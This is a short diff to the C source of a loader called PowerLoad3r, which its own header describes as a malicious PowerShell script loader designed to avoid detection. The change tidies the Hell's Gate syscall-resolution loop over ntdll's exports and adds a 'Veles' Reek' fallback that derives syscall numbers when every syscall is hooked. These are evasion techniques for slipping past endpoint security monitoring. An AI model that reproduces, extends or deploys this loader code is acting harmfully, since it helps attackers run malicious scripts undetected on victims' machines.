@@ -1,7 +1,7 @@
 
 /*
     Author  => Abdallah Mohamed
-    Title   => malicous powershell scripts loader designed to avoid detection.
+    Title   => malicious powershell scripts loader designed to avoid detection.
 */
 
 #include "PowerLoad3r.h"
@@ -73,11 +73,10 @@ DWORD64 djb2(PBYTE str) {
 VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pSyscall)
 {
     PCHAR cFuncName;
-    PBYTE pFuncAddr = NULL;
-    WORD wIdx = 0;
+    PBYTE pFuncAddr = NULL;    
 
     /* HellsGate */
-    for (; wIdx < pNtDLLImg->pExpDir->NumberOfNames; wIdx++)
+    for (WORD wIdx = 0; wIdx < pNtDLLImg->pExpDir->NumberOfNames; wIdx++)
     {
         cFuncName = (PCHAR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfNames[wIdx];
         pFuncAddr = (PBYTE)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pdwAddrOfFunctions[pNtDLLImg->pwAddrOfNameOrdinales[wIdx]];
@@ -103,6 +102,9 @@ VOID FindSyscall(PIMAGE pNtDLLImg, PSYSCALL_ENTRY pSyscall)
             return;
     }
 
+    /* Veles' Reek technique (in case all syscalls were hooked) 
+    Calculate syscall number from its position between others syscalls */    
+    pSyscall->wSyscall = VelesReek(pNtDLLImg->pTextSection->SizeOfRawData, (PVOID)((DWORD_PTR)GETMODULEBASE(pNtDLLImg) + pNtDLLImg->pTextSection->PointerToRawData), pFuncAddr);
 }
 
 VOID ResolveSyscalls(PIMAGE pNtDLLImg)
@@ -688,5 +690,3 @@ CLEANUP:
 
     return nRet;
 }
-
-
